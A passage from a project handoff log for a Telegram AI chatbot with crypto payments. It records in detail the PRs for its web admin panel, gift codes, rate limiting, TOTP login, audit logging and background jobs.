| #6.6 | **Alembic multi-head fix** (PR #72, bundled). PR #70 (`0006_usage_logs_indexes`) and PR #69 (`0006_payment_status_transitions`) both chained off `0005_admin_audit_log`, leaving the alembic graph with two heads. `alembic upgrade head` failed in CI with `Multiple head revisions are present for given argument 'head'` and `alembic upgrade head` would fail on every fresh deploy. Fix: changed `0006_usage_logs_indexes.down_revision` to `0006_payment_status_transitions` so the chain linearizes to `... → 0005 → 0006_payment_status_transitions → 0006_usage_logs_indexes`. The two migrations are independent (one creates a table, the other adds indexes on a different table), so the order is arbitrary; picking this direction means a production deploy at `0005_admin_audit_log` will apply `0006_payment_status_transitions` (CREATE TABLE) and then `0006_usage_logs_indexes` (two CREATE INDEX), which is the safest sequence. Verified locally: `alembic heads` returns a single head; the alembic-roundtrip CI job now passes. |

### P1 — correctness bugs
| # | What |
| --- | --- |
| #7  | `amt_custom` callback reachability (handler-ordering fix). |
| #8  | Non-`finished` IPN status handling (`expired`/`failed`/`refunded`). |
| #9  | Partial-payment crediting via `actually_paid_usd`. |
| #10 | `finished`-after-`partially_paid` credits the **delta**, not zero. |
| #11 | `mark_transaction_terminal` accepts PARTIAL ∪ PENDING. |
| #13 | Report `$0` (not invoice price) when closing PENDING terminally. |

### P2 — product surface (#12, #14–#16, #25–#37)
Hub navigation, FSM clearing, i18n, model picker filter, conversation memory,
free-models tab, NowPayments error log polish, rate-lock screen, etc.
See git log; not repeating here — they're all in `main`.

### IPN signature fix (the one the user was stuck on)
| # | What |
| --- | --- |
| #38 | Diagnostic logging on signature mismatch (`expected/received` prefixes + lengths). |
| #39 | **`json.dumps(..., ensure_ascii=False)` in canonical re-serialization.** Persian `order_description` was being escaped to `\uXXXX` (6 bytes/char) while NowPayments signs raw UTF-8 (~2 bytes/char). 40-byte length gap → HMAC mismatch. Verified against the user's `body_len=585 canonical_len=625` log. |

### P3 — operational hardening (the original stage-2 list, completed this cycle)
| PR | Title |
| --- | --- |
| [#41](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/41) | **P3-Op-1**: two-pass IPN verifier — sign raw body first, fall back to canonicalized. Stripe-style. |
| [#42](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/42) | **P3-Op-2**: Dockerfile + docker-compose. |
| [#43](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/43) | **P3-Op-3**: pytest skeleton + GitHub Actions CI matrix. |
| [#44](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/44) | **P3-Op-4**: Alembic migrations + entrypoint runs `alembic upgrade head`. |
| [#45](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/45) | **P3-Op-4-Hotfix**: URL-encode DB credentials in `alembic/env.py` (Devin Review catch). |
| [#46](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/46) | **P3-Op-5**: Redis-backed FSM + reject NaN/Inf/over-cap custom amounts. |
| [#47](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/47) | **P3-Op-6**: per-user chat + per-IP webhook rate limits + OpenRouter `aiohttp.ClientTimeout`. |
| [#48](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/48) | **P3-Op-6-Hotfix**: scope chat throttle to AI handler only (Devin Review catch). |

### Stage-7 — Telegram-side admin commands (completed)
The original "Stage 7 CLI panel" was reframed as Telegram commands (gated by
`ADMIN_USER_IDS` in env). All four sub-stages shipped:

| PR | Command surface |
| --- | --- |
| [#49](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/49) | **Stage-7-Part-1**: `is_admin` gate, `/admin` hub, `/admin_metrics`. + `message.text=None` crash fix in `process_custom_amount_input`. |
| [#50](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/50) | **Stage-7-Part-2**: `/admin_balance`, `/admin_credit`, `/admin_debit` with `transactions.notes` audit column (alembic 0002). + defensive guard for malformed OpenRouter responses. |
| [#51](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/51) | **Stage-7-Part-3**: `/admin_promo_create`, `/admin_promo_list`, `/admin_promo_revoke`. + `from_user is None` guard in `process_chat`. |
| [#52](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/52) | **Stage-7-Part-4**: `/admin_broadcast [--active=N]` with paced fan-out + progress + Markdown-escape fix for free-form `reason`/`notes`. |

### Cleanup PR ([#53](https://github.com/od0015058-glitch/biuecfybyicwyncafciefaciwucyefaaiaciwy/pull/53))
- Deleted `schema.sql` and `migrations/*.sql` — Alembic owns schema now,
  the legacy files were stale leftovers (the docker-compose mount-list
  maintenance burden goes with them too).
- Same defensive `from_user is None` guard added to `process_promo_input`
  and `process_custom_amount_input` (the FSM-state handlers PR #51 didn't
  cover). Two new regression tests pin both guards.

### Stage-8 — Web admin panel (in progress)
| PR | Title |
| --- | --- |
| **Stage-8-Part-1** | Web admin scaffold — aiohttp+jinja2 mounted under `/admin/` on the same server as the IPN webhook. HMAC-signed-cookie auth via `ADMIN_PASSWORD` + `ADMIN_SESSION_SECRET`. Login + dashboard with system metrics. + `from_user is None` guard added to `cmd_start` and `_route_legacy_text_to_hub` (the two remaining handlers reachable from anonymous-group-admin posts). 30 new tests. |
| **Stage-8-Part-2** | Promo codes web UI — `/admin/promos` page with table view + create form + per-row revoke. CSRF-protected POSTs (HMAC tokens derived from session cookie). Signed flash-cookie banners (10s TTL) survive the post-redirect-get cycle without a server-side store. **Bug fix bundled:** `Database.create_promo_code` + `parse_promo_form` now reject `discount_amount > 999_999.9999` up-front so admins get a friendly error instead of PG `numeric field overflow` (column is `DECIMAL(10,4)`). 39 new tests. |
| **Stage-8-Part-3** | Gift codes — alembic `0003_gift_codes` (new `gift_codes` + `gift_redemptions` tables, distinct from `promo_codes`/`promo_usage`). Five new `Database` methods (`create_gift_code`, `list_gift_codes`, `revoke_gift_code`, `get_gift_redemptions`, atomic `redeem_gift_code` with `FOR UPDATE` locks). `/admin/gifts` web UI (list/create/revoke, CSRF + flash, mirroring promos). User-side `/redeem CODE` Telegram command with full localized error branches (not_found / inactive / expired / exhausted / already_redeemed / user_unknown / ok). **Bug fix bundled:** both `parse_gift_form` and `parse_promo_form` now cap `expires_in_days` at `EXPIRES_IN_DAYS_MAX = 36_500` (≈100 years) — without the cap, an admin pasting a giant integer would crash the create handler with an uncaught `OverflowError` from `timedelta(days=...)` → 500 instead of a friendly red banner. 56 new tests (286 total). |

---

## 5. The user's pivot — Stage-8: Web admin panel + gift codes

> The user explicitly asked for this on 2026-04-28, replacing the original
> "Stage 8 — webhook security" item from the Persian roadmap (already shipped
> as P0/P1/P3-Op-1). The Telegram-side `/admin_*` commands stay (still work,
> still gated), but they are no longer the primary UI.

### Why a web panel
The user found the Telegram-command UI hard to use ("typing slash commands is
painful, give me buttons in a browser"). New requirement: a real web admin
dashboard the user can open in any browser, log in, and click through.

### The new gift-code concept (distinct from existing promo codes)
| | Existing promo code | **NEW: gift code** |
| --- | --- | --- |
| Triggered by | User applying it during a paid invoice | User redeeming it standalone (no purchase required) |
| Effect | Adds bonus % or $ on top of a paid top-up | Directly credits balance |
| Cap | `max_uses` (total redemptions) | `max_uses` (total redemptions) — same shape |
| Per-user | Single redemption (`promo_usage` table) | Single redemption (`gift_redemptions` table) |
| Admin sets | Code + discount % or $ + max_uses + expiry | Code + **fixed $ amount** + max_uses + expiry |
| Schema | `promo_codes` | new `gift_codes` table (alembic 0003) |
| User flow | Apply during charge picker | New `/redeem CODE` command **or** "Redeem gift code" wallet button |

The user's exact wording (paraphrased): "I want to set 10 people and 10
people use that code to increase their balance as much as I want." → that's
a gift code with `max_uses=10`, `amount_usd=$X`, no expiry, that can be
redeemed by any 10 distinct telegram_ids.

### Stage-8 stack (decided, not asked)
- **Server-side:** mount on the **same** aiohttp app that already serves
  `/nowpayments-webhook`. Routes under `/admin/`. One process, one
  Dockerfile, one deploy. No FastAPI / no Node.
- **Templating:** `jinja2` (already a stable, well-known choice; no build
  step required).
- **Frontend interactivity:** vanilla HTML forms + a sprinkle of HTMX where
  it removes 80% of the JS we'd otherwise need (e.g. live broadcast progress).
- **Auth:** `ADMIN_PASSWORD` env var → login form sets a signed (HMAC) cookie
  with a 24h TTL. Existing `ADMIN_USER_IDS` list is still used to attribute
  "which admin" performed an action (recorded into `transactions.notes`
  via `admin_adjust_balance`). No OAuth, no third-party SSO.
- **Hosting:** the bot's aiohttp server already binds port 8080. The same
  port serves admin routes behind `/admin/`. Expose externally via the
  existing Cloudflare tunnel (or whatever the user uses for `WEBHOOK_BASE_URL`).
  Admin URL becomes e.g. `https://bot.example.com/admin/login`.

### Stage-8 PR queue
Each is a separate PR with a real bundled bug fix, HANDOFF.md + README.md
updated, full tests:

| # | Title | Status |
| --- | --- | --- |
| **Stage-8-Part-1** | Web admin scaffold — login + dashboard with system metrics. `web_admin.py` + `templates/admin/`. Auth via `ADMIN_PASSWORD` + `ADMIN_SESSION_SECRET` HMAC-signed cookie. | ✅ shipped (PR #54) |
| **Stage-8-Part-2** | Promo codes page — table view + create form + revoke action. Reuses `Database.list_promo_codes` + `create_promo_code` + `revoke_promo_code`. CSRF + flash messaging primitives added to `web_admin.py`. | ✅ shipped (PR #55) |
| **Stage-8-Part-3** | **Gift codes** — alembic 0003 (`gift_codes` + `gift_redemptions`), DB methods, `/redeem CODE` user-facing flow, admin UI for create/list/revoke. **(Wallet-menu button + redemption stats page deferred to Part-3.5 if user asks.)** | ✅ shipped (PR #56) |
| **Stage-8-Part-4** | Users page — `/admin/users` search-by-id-or-username, `/admin/users/{id}` detail page (balance, lifetime totals, last 20 transactions), credit/debit form posting to `/admin/users/{id}/adjust`. Reuses `admin_adjust_balance`; web calls pass `admin_telegram_id=0` sentinel and `[web]` -prefixed reason into `transactions.notes` for unambiguous audit trail. New `Database.search_users(query, limit)` with int-lookup / escaped ILIKE dispatch; `get_user_admin_summary` now takes `recent_tx_limit` kwarg (default 5, clamped [1..200]). **Bug fix bundled:** `Database.get_system_metrics` now excludes both `gateway='admin'` AND `gateway='gift'` from `revenue_usd` — latent since PR #56 shipped gift redemptions with `gateway='gift'`, which inflated the dashboard's "revenue" figure every time an admin minted a gift code. Regression test pins the filter. 45 new tests (331 total). | ✅ this PR |
| **Stage-8-Part-5** (this PR) | Broadcast page — `/admin/broadcast` form (text + optional `only_active_days` filter) that kicks off a background `asyncio.Task`, plus `/admin/broadcast/{job_id}` detail page with a live progress bar and a polling `/admin/broadcast/{job_id}/status` JSON endpoint (vanilla JS, no HTMX). In-memory job registry on the aiohttp app (bounded to 50 entries, never evicts live jobs). Shares `admin._do_broadcast` with the Telegram `/admin_broadcast` command via a `progress_callback` refactor, so pacing / 429 handling / error bucketing is identical for both callers. **Bug fix bundled:** `rate_limit.webhook_rate_limit_middleware` is now scoped to `/nowpayments-webhook` only — it was previously installed globally and consumed a token on **every** request, so admin-panel traffic (and the new broadcast status-polling page) would eat from the NowPayments bucket and vice-versa. 33 new tests (364 total). | ✅ this PR |
| **Stage-8-Part-6** (this PR) | Transactions browser — paginated `/admin/transactions` list, filter by gateway / status / user, link through to existing user-detail page. Read-only ledger view; credit/debit still lives on the user-detail page so the write-path audit trail has one canonical entry point. New `Database.list_transactions(gateway, status, telegram_id, page, per_page)` with allow-listed enum filters and parameterised SQL; clamps `per_page` to `TRANSACTIONS_MAX_PER_PAGE=200`. Sidebar link is now enabled — the whole Stage-8 nav is complete. **Bug fix bundled:** both `parse_broadcast_args` (Telegram) and `parse_broadcast_web_form` (web) now reject `only_active_days > 36_500` up-front — pre-fix an admin typing `--active=9999999999` would overflow PG's 32-bit-int interval column when `iter_broadcast_recipients` formatted it as `f"{N} days"`, surfacing as an opaque "DB query failed" banner instead of a friendly validation error. Defensive cap also added inside `Database.iter_broadcast_recipients` itself so a direct REPL caller can't hit the overflow either. 30 new tests (394 total). | ✅ this PR |

### Stage-9 queue (next 10 steps)
Sorted by the same §3 priority framework — money/security first, product surface last, operational hardening last. Each step is one PR with a real bundled bug fix (never invented), HANDOFF.md + README.md updated per §11.

| # | Title | Priority | Status |
| --- | --- | --- | --- |
| **Stage-9-Step-1** | Per-IP token-bucket throttle on `/admin/login`. New `install_login_rate_limit` + `consume_login_token` helpers in `rate_limit.py`; `login_post` now consumes a token BEFORE the password compare so a spraying attacker can't get constant-time feedback on every guess. Defaults: 10-token burst, 1 token / 30 s refill — combined with `ADMIN_PASSWORD` being a 32-char secret this makes brute force infeasible. **Bug fix bundled:** the existing `request.remote` keying collapses every reverse-proxy deploy onto one bucket IP, which either (a) silently disables the new login throttle (the tunnel IP is fine, bucket never drains) or (b) self-DoSes (one attacker locks every admin out of the same tunnel). New `rate_limit.client_ip_for_rate_limit(request)` helper reads `X-Forwarded-For` leftmost IP iff `TRUST_PROXY_HEADERS=1` env var is set (defaults off so direct-exposure deploys don't trust a spoofable header). Retrofitted the existing webhook middleware to use the same helper so the two limiters gain real-client granularity together. 12 new tests (406 total). | P0 security | ✅ shipped (PR #60) |
| **Stage-9-Step-1.5** | **User-side bot UX cleanup** (P2 product, taken out of order at user request 2026-04-28). New `bot_commands.py` module + boot-time `Bot.set_my_commands(...)` call so Telegram's `/` popup matches the handlers we actually ship — `/start`, `/redeem` for everyone; admin commands per-admin via `BotCommandScopeChat`. Pre-fix the bot never published its commands so the popup served whatever was last typed into BotFather's "Edit Commands" panel (the user reported `/new`, `/redo`, `/img`, `/version` ghosts). Hub keyboard split: dedicated `🆕 New Chat` button now wipes the conversation buffer immediately (free) and a separate `🧠 Memory: ON/OFF` button opens the memory settings screen with the cost trade-off explainer. Wallet keyboard gained a `🎁 Redeem gift code` button that arms a new `UserStates.waiting_gift_code` and reuses the same `_redeem_code_for_user` helper as `cmd_redeem` — gift redemption is now reachable from buttons, not just the slash command. **Bug fix bundled:** `_render_memory_screen`'s `try/except Exception` around `edit_text` was swallowing every exception including DB drops, `TelegramForbiddenError` (bot blocked), and unrelated network blips — masking real bugs as a single `log.debug`. Tightened to `except TelegramBadRequest:` so only the legitimate "message is not modified" / parse-mode no-op cases are silenced. 29 new tests (435 total). | P2 product | ✅ this PR |
| **Stage-9-Step-1.6** (this PR) | **Editable bot text** (P2 product, second of three out-of-order PRs requested by the user 2026-04-28). New `bot_strings(lang, key, value, updated_at, updated_by)` table + alembic migration `0004_bot_strings`. The runtime `t()` helper grew an in-memory override cache (`strings._OVERRIDES`) populated at boot from `Database.load_all_string_overrides` and refreshed after every successful admin write — so the next message a user receives uses the new text without any process restart. New `/admin/strings` page lists every `(lang, key)` slug with its compiled default and current override (if any), filterable by lang + free-text search. New `/admin/strings/{lang}/{key}` editor: textarea pre-filled with the override-or-default, save / revert buttons, length cap of 2 KB to keep the operator from pasting megabyte JSON into a button label, CSRF-protected. Reverting deletes the row and resurrects the compiled default. **Bug fix bundled:** `t()` previously returned the bare slug silently when a key was missing in both the requested locale and the `DEFAULT_LANGUAGE` fallback — translator typos shipped to users invisibly. Now logs a one-shot WARNING per `(lang, key)` per process so dictionary drift surfaces in ops logs. 38 new tests (473 total): 19 in `tests/test_strings_overrides.py`, 19 added to `tests/test_web_admin.py`. | P2 product | ✅ this PR |
| **Stage-9-Step-2** | `admin_audit_log` append-only table — one row per admin action (login success/fail, promo + gift create/revoke, credit/debit, broadcast start, string save/revert, user edit) with `ts, actor, action, ip, target, outcome, meta_json`. Viewable at `/admin/audit` with optional action + actor filters. `/admin/users/{id}/edit` POST now updates an allow-listed subset of user fields (`language_code`, `active_model`, `memory_enabled`, `free_messages_left`, `username`) atomically; balance still routes through `/admin/users/{id}/adjust` so every change leaves a transactions-ledger row. **Bug fix bundled:** `Database.admin_adjust_balance` no longer relies solely on the legacy `gateway_invoice_id` string encoding for the acting admin id — every new adjustment also populates a real `transactions.admin_telegram_id` column with a partial index for forensics. Audit writes are wrapped in `_record_audit_safe`, swallowing exceptions so a failed audit insert never rolls back the underlying admin operation. | P0 security | ✅ done (PR-C) |
| **Stage-9-Step-3** (this PR) | TOTP / 2FA on admin login. New optional env vars `ADMIN_2FA_SECRET` (base32 secret — empty keeps password-only login, full back-compat) + `ADMIN_2FA_ISSUER` (authenticator-app label). When configured, `/admin/login` requires a 6-digit code from any RFC-6238 authenticator (Google Authenticator, Authy, 1Password, Bitwarden) in addition to `ADMIN_PASSWORD`. The TOTP check runs *after* the password compare so an attacker without the password can't probe the 6-digit code in isolation — a missing/bad code on a wrong-password attempt always renders the generic "Wrong password" banner. New `/admin/enroll_2fa` page (auth-required) renders an inline-SVG QR + the chunked manual key + the `otpauth://` URI; when nothing is configured, each load shows a freshly-generated suggestion (never cached server-side, so an over-the-shoulder screenshot can't pin a future secret). New helpers: `validate_totp_secret` (boot-time base32 validator with ≥80-bit entropy floor, normalises spaced/lowercase paste), `verify_totp_code` (constant-time RFC-6238 verify with ±30 s drift window, swallows pyotp errors as `False`), `build_otpauth_uri`, `render_qr_svg` (qrcode lib with `SvgPathImage` factory — no Pillow dep). New deps: `pyotp>=2.9.0`, `qrcode>=7.4.2`. New audit slug `enroll_2fa_view`; deny-reason metadata grew `missing_2fa` / `bad_2fa` so `/admin/audit` distinguishes "wrong code" from "wrong password" in `meta_json`. **Bug fix bundled:** `setup_admin_routes` now refuses to start when `ADMIN_PASSWORD` or `ADMIN_SESSION_SECRET` is set to a *whitespace-only* string (a common copy-paste deploy typo). Pre-fix the value was stored verbatim and every login attempt silently rejected as "Wrong password" — operators spent hours debugging a stray space in their `.env`. Truly empty values still install the panel in "unreachable" mode (the documented dev path), so the back-compat boundary is whitespace-only-but-non-empty → fail-fast at boot. The same boot-time guard rejects an invalid base32 `ADMIN_2FA_SECRET` so a typo in the second-factor secret surfaces immediately rather than at first login. 27 new tests (534 total): 11 pure-helper tests for `validate_totp_secret` + `verify_totp_code` (empty / whitespace-normalised / short-secret rejection / non-digit rejection / pyotp-raises swallowing), 7 login-flow integration tests (form omits/includes `code` field, missing/bad/valid codes, password-then-2FA ordering, back-compat when 2FA disabled), 5 enrolment-page tests (auth-gating, suggestion banner, configured-secret render, non-cached suggestion freshness, audit-trail deny reason). | P0 security | ✅ this PR |
| **Stage-9-Step-4** | IPN webhook replay-dedupe. New `payment_status_transitions` table keyed by `(gateway_invoice_id, payment_status)` so a backdated PARTIAL arriving after SUCCESS is dropped rather than writing a stray ledger row. **Bug fix bundled:** `parse_ipn_body` silently drops IPNs with missing `payment_id` — log LOUDLY and expose a counter so a misconfigured sandbox hitting the prod webhook is immediately visible. | P1 correctness | ✅ shipped (PR #66) |
| **Stage-9-Step-5** (this PR) | Background reaper for stuck `PENDING` transactions. New `pending_expiration.py` module exposes `start_pending_expiration_task(bot)` — `main.main` spawns it after `start_webhook_server`, cancels + awaits it on shutdown. The loop wakes every `PENDING_EXPIRATION_INTERVAL_MIN` (default 15) minutes, calls `Database.expire_stale_pending(threshold_hours=PENDING_EXPIRATION_HOURS or 24)` which atomically flips `PENDING` rows older than the threshold to `EXPIRED` (single `UPDATE … FROM (SELECT … FOR UPDATE SKIP LOCKED) RETURNING *` — multi-replica safe + bounded by `PENDING_EXPIRATION_BATCH=1000` so a backlog doesn't blow the connection pool). Per-row aftermath: one `payment_expired` audit row (`actor="reaper"`) and one courtesy Telegram ping using the existing `pay_expired_pending` string; `TelegramForbiddenError` / `TelegramBadRequest` are swallowed (a user who blocked the bot is exactly the user we're cleaning up). The scheduler logs an `ERROR` on any per-tick exception and keeps going so a transient blip doesn't kill the reaper. **Bug fix bundled:** `Database.mark_transaction_terminal` previously accepted any string for `new_status` and silently re-`UPDATE`d `completed_at` on a same-status no-op (the WHERE only checked `status IN ("PENDING","PARTIAL")`, not whether the new value differed). Tightened to (1) raise `ValueError` if `new_status` not in `Database.TERMINAL_FAILURE_STATUSES = {"EXPIRED","FAILED","REFUNDED"}` at the API surface, and (2) add `AND status != $2` to the UPDATE WHERE as belt-and-suspenders — `completed_at` can no longer get bumped on a row that didn't actually transition, so forensics queries trust the column again. 17 new tests (524 total): 3 SQL-shape pins on `expire_stale_pending` (UPDATE … FROM SELECT … FOR UPDATE SKIP LOCKED, threshold validation, empty-result handling); 4 FSM-tightening pins on `mark_transaction_terminal` (rejects PENDING/PARTIAL/SUCCESS, UPDATE has `AND status != $2`, idempotent on already-terminal, `TERMINAL_FAILURE_STATUSES` membership); 4 `_read_int_env` parsing/clamping pins; 5 `expire_pending_once` integration tests (no-op on empty, audit + notify on each row, audit failure doesn't block notify, Telegram block swallowed, DB failure returns 0); 1 task-cancellation test. New env vars: `PENDING_EXPIRATION_INTERVAL_MIN`, `PENDING_EXPIRATION_HOURS`, `PENDING_EXPIRATION_BATCH` (all optional, sane defaults, garbage values fall back loudly). | P1 correctness | ✅ this PR |
| **Stage-9-Step-6** | Soft-cancel running broadcasts. Cancel button on `/admin/broadcast/{id}` sets `job["cancel_requested"]`; `_do_broadcast` checks between sends. **Bug fix bundled:** the in-memory job registry's 50-entry cap evicts oldest-first without checking state — an admin spamming the form could push a live `running` job off the end of the dict. Guard eviction on `state ∈ {completed, failed}`. Plus a paired fix from the post-merge audit: an unbounded `TelegramRetryAfter.retry_after` advisory could pin the broadcast worker for hours; now capped at `BROADCAST_RETRY_AFTER_MAX_SECONDS=120` so a runaway 429 hint can't outlast a deploy. | P1 correctness | ✅ shipped (PR #68) |
| **Stage-9-Step-8** (this PR) | Per-user usage log browser — `GET /admin/users/{id}/usage` lists last N AI calls (id, when, model, prompt/completion/total tokens, cost USD) with prev/next pagination and a per-page picker. Above the table, lifetime aggregates (`total_calls`, `total_tokens`, `total_cost_usd`) are surfaced as three stat cards via the new `Database.get_user_usage_aggregates` helper. Linked from the existing user-detail page ("View AI usage log →" next to the Recent transactions header). **Bundled bug fix (deviation from spec):** the original handoff prescribed a `cost_usd NOT NULL` backfill, but inspection of `0001_baseline.py:64-72` shows the column is `cost_deducted_usd` and is **already** `DECIMAL(10,6) NOT NULL` — the spec's premise was wrong. The real latent bug is that **`usage_logs` has no indexes beyond the PK** (`alembic/versions/0001_baseline.py:64-72` declares only `log_id SERIAL PRIMARY KEY`). The new browser's canonical query (`WHERE telegram_id = $1 ORDER BY created_at DESC LIMIT N`) was a guaranteed sequential scan; at 1M+ rows the table-scan tail latency would be visible to admins. New migration `0006_usage_logs_indexes.py` adds `idx_usage_logs_telegram_created` on `(telegram_id, created_at DESC)` (covers the browser's access pattern with a forward index scan that returns rows in display order — no sort step) and `idx_usage_logs_created` on `(created_at DESC)` (covers global "last N calls fleet-wide" reports). 13 new tests (520 total): 8 web-layer pins (auth required, invalid id redirects, empty state, rows + aggregates rendering, page/per_page kwargs forwarded, per_page clamped to 200, DB error renders friendly banner, user_detail links to usage page) + 5 DB-layer pins (WHERE scoped to telegram_id, per_page clamped to `[1, USAGE_LOGS_MAX_PER_PAGE]`, total_tokens computed server-side, aggregates return zeros on empty, aggregates handle `None` row defensively). | P2 product | ✅ this PR |
| **Stage-9-Step-7** (this PR) | CSV export from `/admin/transactions?format=csv` for quarterly audits. Streams via aiohttp `StreamResponse` in 500-row pages capped at 500k rows so a "everything-ever" filter can't pin the connection pool. Same filter semantics as the HTML page (gateway, status, telegram_id); pagination params are ignored — CSV is always full-result. RFC 4180 quoting (commas, quotes, newlines escape correctly). `Cache-Control: no-store` and `Content-Disposition: attachment; filename="transactions-YYYYMMDDTHHMMSSZ.csv"` so a later admin session on the same machine can't pull a cached copy. Each successful export writes one `transactions_export_csv` audit row recording row count + filters. The HTML transactions page grew an "⬇ Export CSV" link that carries the active filters into the export. **Bundled bug fix:** the admin UI used four different USD formatters — `${:,.4f}` in the transactions browser & user-detail page, `${:,.2f}` in gifts/promos lists, `${value:.4f}` (NO comma grouping) in `/admin_balance`, and `${value:.4f}` in adjust refusal messages. An auditor reconciling a single row across two pages would see ``$1,234.5678`` and ``$1234.5678`` and have to second-guess whether they were actually the same number. New `formatting.format_usd(value, places=4)` is the single canonical formatter — defaults to 4dp (matches the on-screen ledger precision), `places=2` for settlement amounts, leading minus before the dollar sign for negatives. Wired as a Jinja2 filter (`{{ value \| format_usd }}` / `{{ value \| format_usd(2) }}`) so future templates pick it up automatically. 13 new tests (520 total): 5 `format_usd` unit pins (default 4dp, 2dp variant, leading-minus negatives, `places` clamped to `[0,8]`, int input widens to float), 7 CSV-export integration pins (auth required, headers + rows shape, RFC 4180 quoting, audit row written, filters honoured, multi-page streaming, "Export CSV" button on HTML page), 1 Jinja-filter registration pin. | P2 product | ✅ this PR |
| **Stage-9-Step-9** | Dashboard tile: "Pending payments: N (oldest: Xh ago)" so stuck invoices are visible at a glance. Implemented in this PR — `Database.get_system_metrics` now also returns `pending_payments_count` and `pending_payments_oldest_age_hours` (NULL when zero pending so the template suppresses the misleading "oldest 0.0h" sub-label). Telegram-side `admin.format_metrics` adds a matching "⏳ Pending payments" line, omitted entirely when count is zero. **Bug fix bundled:** `Database.log_usage` had no guard on `cost` — a NaN / ±Infinity / negative value would land in `usage_logs.cost_deducted_usd` (PG `NUMERIC` accepts `'NaN'::numeric`, no CHECK constraint) and then poison every aggregate that consumes the column: the dashboard's `spend_usd` tile, the `top_models` per-model totals, and `get_user_usage_aggregates`. The only present caller (`chat_with_model`) clamps via `pricing._apply_markup`'s `max(raw * markup, 0.0)` so production is fine today, but the clamp lives one module away from the SQL — a future refactor / stub `ModelPrice` / new internal billing path bypassing it would silently brick the dashboard. Now `log_usage` refuses non-finite OR negative `cost` with a logged ERROR and skips the INSERT; the user's reply is preserved (the call is fire-and-forget) and the table stays clean. | P2 product | ✅ shipped |
| **Stage-9-Step-10** (this PR) | **Durable broadcast job registry.** New `broadcast_jobs` table (alembic `0007_broadcast_jobs`) mirrors the in-memory `APP_KEY_BROADCAST_JOBS` dict so a restart mid-broadcast leaves a forensic trail. Schema: `job_id PK`, `text_preview` (first ~120 chars only — full text intentionally not stored), `full_text_len`, `only_active_days`, `state`, `total`, `sent_count` / `blocked_count` / `failed_count` (renamed with `_count` suffix to disambiguate from `state="failed"`), `i`, `error`, `cancel_requested`, `created_at` / `started_at` / `completed_at`. Indexed on `created_at DESC` (recent-jobs list) and `state` (orphan sweep). New `Database.insert_broadcast_job` / `update_broadcast_job` / `get_broadcast_job` / `list_broadcast_jobs` / `mark_orphan_broadcast_jobs_interrupted` methods. **Wiring:** `broadcast_post` inserts the durable mirror row right after the in-memory dict is populated (best-effort — a DB blip doesn't block the broadcast). `_run_broadcast_job` mirrors every state transition (`queued → running → completed/failed/cancelled/interrupted`) via `_persist_broadcast_state` and throttled progress updates via `_persist_broadcast_progress` (one UPDATE per `BROADCAST_DB_PROGRESS_FLUSH_EVERY=25` recipients to keep a 10 000-recipient broadcast from being 10 000 UPDATEs; terminal transitions always force-flush). `broadcast_get` reads the recent-jobs list from `list_broadcast_jobs` and layers in-memory live progress on top for any still-running rows. `broadcast_detail_get` / `broadcast_status_get` fall back to `get_broadcast_job` when the in-memory dict is empty (e.g. after a restart) — so a `/admin/broadcast/{id}` link still resolves and a polling tab survives a deploy. `broadcast_cancel_post` mirrors `cancel_requested=True` to the row. `setup_admin_routes` registers an `on_startup` hook that calls `mark_orphan_broadcast_jobs_interrupted` so any row left in `queued`/`running` from before the restart is flipped to a new `interrupted` terminal state with a canned error and `completed_at = NOW()`. **Bug fix bundled:** the original `_run_broadcast_job` `except asyncio.CancelledError` branch labelled the row `state="failed"` AND re-raised before setting `completed_at`, conflating three semantically distinct terminal states (real exception in the send loop = `failed`; admin clicked Cancel and the loop exited cleanly between sends = `cancelled`; process killed/restarted mid-send = the new `interrupted`) and leaving the cancelled job with a `None` completion timestamp forever. Now sets `state="interrupted"` + `completed_at` + mirrors to the durable row BEFORE `raise`, matching the orphan-sweep state for jobs whose worker task didn't even reach the `except` block. The recent-jobs page can now distinguish a deploy-time restart from a code bug. 28 new tests (860 total): 16 web-layer pins (broadcast_post inserts a row + tolerates DB-insert failure, state-transition mirroring on empty/error/cancelled paths, recent-jobs list reads from DB with in-memory fallback when DB fails, detail/status fall back to DB after restart, unknown id redirects with flash, cancel mirrors flag to DB, orphan sweep on app startup + tolerates DB failure, throttled progress flush — every-N-recipients pin + force-flush bypass + DB-blip swallow); 12 DB-layer pins (INSERT shape + state validation, opt-in UPDATE shape + progress-throttle column mapping + None-row returns False + no-op short-circuit + state validation, get returns None for missing id + Record→dict coercion shape, list ordering + LIMIT clamping, orphan sweep WHERE filter + idempotency). | P3 operational | ✅ this PR |

### Stage-10 queue — user's 2026-04-29 direction pivot

After Stage-9 shipped, the user flagged four concrete issues / asks. Bundled into four scoped PRs, same working agreement as §11 (autonomous push, HANDOFF + README updates per PR, CI green before report).

| # | Title | Priority | Status |
| --- | --- | --- | --- |
